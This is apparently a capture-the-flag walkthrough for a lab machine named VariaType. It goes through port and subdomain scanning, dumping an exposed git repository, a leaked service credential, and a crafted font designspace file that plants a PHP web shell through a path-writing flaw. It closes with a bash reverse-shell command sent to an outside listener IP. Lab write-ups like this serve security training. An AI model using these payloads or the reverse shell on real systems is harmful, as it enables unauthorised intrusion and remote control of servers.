# VariaType


<img width="1598" height="279" alt="image" src="https://github.com/user-attachments/assets/13eaa9a8-214f-49e2-aee7-30589be1b817" />


---

## Nmap `Scan`

```
nmap -sCV -Pn <target_ip>
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 10:24 EDT
Nmap scan report for 10.129.244.202
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
                                                                                  
```





<img width="1919" height="798" alt="image" src="https://github.com/user-attachments/assets/9deb30fc-7eed-4a03-b802-e7f78b9fc657" />


```
ffuf -u http://variatype.htb/ \
-H "Host: FUZZ.variatype.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-mc 200
```

<img width="1166" height="507" alt="image" src="https://github.com/user-attachments/assets/85683cb5-e67a-4851-a216-5791b264e621" />



> found subdomain **portal**

```
echo "10.129.244.202 portal.variatype.htb" > /etc/hosts
```


## gobuster


```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://portal.variatype.htb
```


<img width="1170" height="511" alt="image" src="https://github.com/user-attachments/assets/b0c06a84-43b3-4a48-87c4-31601dce6dac" />



## Git repository exposed over HTTP

```
 curl -s http://portal.variatype.htb/.git/HEAD
```

<img width="620" height="117" alt="image" src="https://github.com/user-attachments/assets/eaba1824-4c61-4872-ab74-21e3debb95b5" />

## install git-dummper


```
pip install git-dumper
```

```
git-dumper http://portal.variatype.htb/.git/ dumped_repo
```

```
git log --oneline
git show HEAD
```


<img width="1085" height="499" alt="image" src="https://github.com/user-attachments/assets/7accbbb1-3f0a-4dc6-b5a1-7a88ddd1ecc6" />

## found credential

```
'gitbot' => 'G1tB0t_Acc3ss_2025!'
```

## logedin in **`portal.variytype.htb`** 

<img width="1534" height="457" alt="image" src="https://github.com/user-attachments/assets/44b69b6e-ea58-4f27-9cbf-8e4636d05164" />


## nano cve.py


```
         
#!/usr/bin/env python3
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)

    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})

    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()

    glyph = pen.glyph()

    fb.setupGlyf({".notdef": glyph})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "ExploitFont", "styleName": f"Weight{weight}"})

    fb.save(filename)
    print(f"[+] Created {filename}")

if __name__ == "__main__":
    print("[+] Generating source fonts for VariaType exploit...")
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
    print("[+] Fonts ready! Upload to: http://variatype.htb/tools/variable-font-generator")
```


## nano exploit.designspace

```
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
      <labelname xml:lang="fr">Regular</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```



```
python3 cve.py
```


<img width="1045" height="242" alt="image" src="https://github.com/user-attachments/assets/a4795415-683f-430b-9e67-668c8a05b1b0" />


## open **`http://variatype.htb`**


> upload exploit.designspace in first feilds and other two files in nexst field


## now check if font created  


<img width="1919" height="558" alt="image" src="https://github.com/user-attachments/assets/ca5b9500-eac9-4f18-93bb-07c088c8fdfd" />



```
nc -lnvp 2222

 curl http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.113/2222%200%3E%261%27


```


<img width="910" height="181" alt="image" src="https://github.com/user-attachments/assets/356cf879-583d-41bf-b894-ea1a3b2d140c" />


## try to get first flag from steve 


<img width="757" height="180" alt="image" src="https://github.com/user-attachments/assets/55dd8eae-8ee2-4aa7-bdda-10bfd8552e68" />























































